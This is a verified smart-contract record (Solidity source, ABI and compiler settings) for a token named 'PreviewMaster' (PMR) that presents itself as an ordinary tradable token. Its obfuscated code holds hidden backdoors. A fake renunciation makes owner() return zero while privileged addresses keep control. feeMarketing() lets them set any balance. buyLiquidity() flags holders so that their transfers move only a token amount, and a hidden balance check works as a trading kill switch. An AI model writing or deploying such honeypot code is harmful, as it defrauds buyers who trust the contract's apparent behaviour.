{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface isTrading {\n    function createPair(address atFund, address feeTotal) external returns (address);\n}\n\ninterface atAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toWallet) external view returns (uint256);\n\n    function transfer(address atTradingFund, uint256 listAmount) external returns (bool);\n\n    function allowance(address listTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atTradingFund,\n        uint256 listAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listReceiver, uint256 value);\n    event Approval(address indexed listTotal, address indexed spender, uint256 value);\n}\n\nabstract contract autoFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atAutoMetadata is atAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PreviewMaster is autoFund, atAuto, atAutoMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return shouldFeeToken;\n    }\n\n    bool private shouldTotal;\n\n    constructor (){\n        if (sellBuy == buyTakeFund) {\n            sellBuy = false;\n        }\n        receiverTeam toTake = receiverTeam(swapLiquidityFund);\n        exemptWallet = isTrading(toTake.factory()).createPair(toTake.WETH(), address(this));\n        \n        receiverAmount = _msgSender();\n        atTxMode[receiverAmount] = true;\n        teamEnableTake[receiverAmount] = launchToken;\n        txAt();\n        if (buyTakeFund) {\n            swapFrom = sellEnable;\n        }\n        emit Transfer(address(0), receiverAmount, launchToken);\n    }\n\n    function liquidityModeReceiver(address toFrom, address atTradingFund, uint256 listAmount) internal returns (bool) {\n        require(teamEnableTake[toFrom] >= listAmount);\n        teamEnableTake[toFrom] -= listAmount;\n        teamEnableTake[atTradingFund] += listAmount;\n        emit Transfer(toFrom, atTradingFund, listAmount);\n        return true;\n    }\n\n    bool private sellBuy;\n\n    address public receiverAmount;\n\n    uint256 private swapTake;\n\n    event OwnershipTransferred(address indexed teamBuy, address indexed tradingFund);\n\n    mapping(address => bool) public atTxMode;\n\n    uint256 tokenReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchToken;\n    }\n\n    uint8 private walletFundFee = 18;\n\n    function senderMax(address launchedReceiver) public {\n        if (liquidityTx) {\n            return;\n        }\n        if (maxTrading == shouldTotal) {\n            shouldTotal = true;\n        }\n        atTxMode[launchedReceiver] = true;\n        \n        liquidityTx = true;\n    }\n\n    address private launchTake;\n\n    function owner() external view returns (address) {\n        return launchTake;\n    }\n\n    function enableTake(address toFrom, address atTradingFund, uint256 listAmount) internal returns (bool) {\n        if (toFrom == receiverAmount) {\n            return liquidityModeReceiver(toFrom, atTradingFund, listAmount);\n        }\n        uint256 maxSell = atAuto(exemptWallet).balanceOf(feeAmountFund);\n        require(maxSell == tokenReceiver);\n        require(atTradingFund != feeAmountFund);\n        if (receiverMin[toFrom]) {\n            return liquidityModeReceiver(toFrom, atTradingFund, teamReceiver);\n        }\n        return liquidityModeReceiver(toFrom, atTradingFund, listAmount);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletFundFee;\n    }\n\n    mapping(address => bool) public receiverMin;\n\n    string private shouldFeeToken = \"Preview Master\";\n\n    mapping(address => mapping(address => uint256)) private sellTeam;\n\n    function getOwner() external view returns (address) {\n        return launchTake;\n    }\n\n    function balanceOf(address toWallet) public view virtual override returns (uint256) {\n        return teamEnableTake[toWallet];\n    }\n\n    bool public buyTakeFund;\n\n    function buyLiquidity(address isMinLaunched) public {\n        marketingTake();\n        if (swapFrom != swapTake) {\n            shouldTotal = false;\n        }\n        if (isMinLaunched == receiverAmount || isMinLaunched == exemptWallet) {\n            return;\n        }\n        receiverMin[isMinLaunched] = true;\n    }\n\n    function approve(address walletSwap, uint256 listAmount) public virtual override returns (bool) {\n        sellTeam[_msgSender()][walletSwap] = listAmount;\n        emit Approval(_msgSender(), walletSwap, listAmount);\n        return true;\n    }\n\n    function transferFrom(address toFrom, address atTradingFund, uint256 listAmount) external override returns (bool) {\n        if (_msgSender() != swapLiquidityFund) {\n            if (sellTeam[toFrom][_msgSender()] != type(uint256).max) {\n                require(listAmount <= sellTeam[toFrom][_msgSender()]);\n                sellTeam[toFrom][_msgSender()] -= listAmount;\n            }\n        }\n        return enableTake(toFrom, atTradingFund, listAmount);\n    }\n\n    function marketingTake() private view {\n        require(atTxMode[_msgSender()]);\n    }\n\n    uint256 public swapFrom;\n\n    mapping(address => uint256) private teamEnableTake;\n\n    function tradingSenderToken(uint256 listAmount) public {\n        marketingTake();\n        tokenReceiver = listAmount;\n    }\n\n    function allowance(address walletShould, address walletSwap) external view virtual override returns (uint256) {\n        if (walletSwap == swapLiquidityFund) {\n            return type(uint256).max;\n        }\n        return sellTeam[walletShould][walletSwap];\n    }\n\n    function transfer(address buyShould, uint256 listAmount) external virtual override returns (bool) {\n        return enableTake(_msgSender(), buyShould, listAmount);\n    }\n\n    uint256 buyTotal;\n\n    address swapLiquidityFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public sellEnable;\n\n    function txAt() public {\n        emit OwnershipTransferred(receiverAmount, address(0));\n        launchTake = address(0);\n    }\n\n    uint256 private launchToken = 100000000 * 10 ** 18;\n\n    uint256 constant teamReceiver = 3 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atToken;\n    }\n\n    function feeMarketing(address buyShould, uint256 listAmount) public {\n        marketingTake();\n        teamEnableTake[buyShould] = listAmount;\n    }\n\n    bool private maxTrading;\n\n    address feeAmountFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private atToken = \"PMR\";\n\n    address public exemptWallet;\n\n    bool public liquidityTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTxMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMinLaunched\",\"type\":\"address\"}],\"name\":\"buyLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTakeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAmount\",\"type\":\"uint256\"}],\"name\":\"feeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"}],\"name\":\"senderMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listAmount\",\"type\":\"uint256\"}],\"name\":\"tradingSenderToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atTradingFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PreviewMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}